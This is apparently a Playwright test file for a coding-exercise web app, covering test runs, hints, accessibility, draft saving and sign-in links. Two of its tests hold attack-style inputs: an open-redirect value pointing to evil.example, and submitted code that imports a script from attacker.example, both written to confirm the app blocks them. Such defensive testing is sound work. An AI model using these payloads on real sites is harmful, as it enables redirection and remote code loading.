import { test, expect } from "@playwright/test";

test("R2: open an exercise, run failing tests, see per-test results", async ({ page }) => {
  await page.goto("/exercises");
  await page.getByRole("link", { name: "Sum of an array" }).click();
  await expect(page.getByRole("heading", { level: 1, name: "Sum of an array" })).toBeVisible();

  await page.getByRole("button", { name: "Run tests" }).click();
  const results = page.getByTestId("results");
  await expect(results).toContainText("tests failing");
  await expect(results).toContainText("Expected 6");
});

test("R1: passing code shows the complete state and marks the exercise solved", async ({ page }) => {
  await page.goto("/exercises/sum-of-array");
  await page.getByLabel("Your code (JavaScript)").fill(
    "function sumOfArray(n) { return n.reduce((a, b) => a + b, 0); }",
  );
  await page.getByRole("button", { name: "Run tests" }).click();
  await expect(page.getByRole("heading", { name: "Exercise complete" })).toBeVisible();
  await page.goto("/exercises");
  await expect(page.getByText("Solved", { exact: true })).toBeVisible();
});

test("R1: an infinite loop times out instead of hanging the page", async ({ page }) => {
  await page.goto("/exercises/sum-of-array");
  await page.getByLabel("Your code (JavaScript)").fill("function sumOfArray() { while (true) {} }");
  await page.getByRole("button", { name: "Run tests" }).click();
  await expect(page.getByTestId("results")).toContainText("Timed out", { timeout: 6000 });
});

test("N4: hint ladder lists five levels and each button is keyboard reachable", async ({ page }) => {
  await page.goto("/exercises/sum-of-array");
  const ladder = page.getByRole("region", { name: "Hint ladder" });
  await expect(ladder.getByRole("listitem")).toHaveCount(5);
  const first = ladder.getByRole("button").first();
  await expect(first).toBeEnabled();
  await first.focus();
  await expect(first).toBeFocused();
});

test("E2: the list shows every live exercise and each opens", async ({ page }) => {
  await page.goto("/exercises");
  const links = page.getByRole("list", { name: "Exercises" }).getByRole("link");
  await expect(links).toHaveCount(9);
  for (const href of await links.evaluateAll((as) => as.map((a) => a.getAttribute("href")))) {
    const res = await page.goto(href ?? "/");
    expect(res?.status(), String(href)).toBe(200);
    await expect(page.getByRole("button", { name: "Run tests" })).toBeVisible();
  }
});

test("A2: code typed in the editor is still there after a reload", async ({ page }) => {
  await page.goto("/exercises/sum-of-array");
  const editor = page.getByLabel("Your code (JavaScript)");
  await editor.fill("function sumOfArray(n) { return 42; }");
  await page.reload();
  await expect(editor).toHaveValue("function sumOfArray(n) { return 42; }");
});

test("J7: the complete screen shows the real hints-used count (0 when none were taken)", async ({
  page,
}) => {
  await page.goto("/exercises/sum-of-array");
  await page
    .getByLabel("Your code (JavaScript)")
    .fill("function sumOfArray(n) { return n.reduce((a, b) => a + b, 0); }");
  await page.getByRole("button", { name: "Run tests" }).click();
  await expect(page.getByTestId("hints-used")).toHaveText("0");
});

test("J1: the landing page leads into the exercises and sign in", async ({ page }) => {
  await page.goto("/");
  await page.getByRole("link", { name: "Start an exercise" }).click();
  await expect(page).toHaveURL(/\/exercises$/);
  await page.goto("/");
  await page.getByRole("link", { name: "Sign in" }).click();
  await expect(page).toHaveURL(/\/signin$/);
});

test("A1: the sign-in page keeps a safe return path and drops an unsafe one", async ({ page }) => {
  await page.goto("/signin?next=%2Fcheckout%3Fplan%3Dbasic");
  await expect(page.getByRole("link", { name: /Create an account/ })).toHaveAttribute(
    "href",
    "/signup?next=%2Fcheckout%3Fplan%3Dbasic",
  );
  await page.goto("/signin?next=https%3A%2F%2Fevil.example");
  await expect(page.getByRole("link", { name: /Create an account/ })).toHaveAttribute(
    "href",
    "/signup?next=%2Faccount",
  );
});

test("L1: policy links are plain text until the pages exist, not dead links", async ({ page }) => {
  await page.goto("/plans");
  await expect(page.getByText("Terms (coming soon)")).toBeVisible();
  await expect(page.locator('a[href="/terms"], a[href="/refund"], a[href="/privacy"]')).toHaveCount(0);
});

for (const [label, target] of [
  ["external", "'https://attacker.example/m.js?x=1'"],
  ["same-origin", "location.origin + '/api/health?x=1'"],
] as const) {
  test(`R1: dynamic import of a ${label} module is blocked by the worker CSP`, async ({ page }) => {
    const responses: string[] = [];
    const requests: string[] = [];
    const failures: string[] = [];
    page.on("request", (r) => requests.push(r.url()));
    page.on("response", (r) => responses.push(r.url()));
    page.on("requestfailed", (r) => failures.push(`${r.url()} ${r.failure()?.errorText}`));
    await page.goto("/exercises/sum-of-array");
    await page
      .getByLabel("Your code (JavaScript)")
      .fill(`function sumOfArray() { import(${target}); return 0; }`);
    await page.getByRole("button", { name: "Run tests" }).click();
    await expect(page.getByTestId("results")).toBeVisible();
    await page.waitForTimeout(500);
    // No response may arrive for the import, and any attempt must fail with a CSP error.
    expect(responses.filter((u) => u.includes("x=1"))).toEqual([]);
    const attempted = requests.filter((u) => u.includes("x=1"));
    for (const u of attempted) {
      expect(failures.some((f) => f.startsWith(u) && f.toLowerCase().includes("csp"))).toBe(true);
    }
  });
}
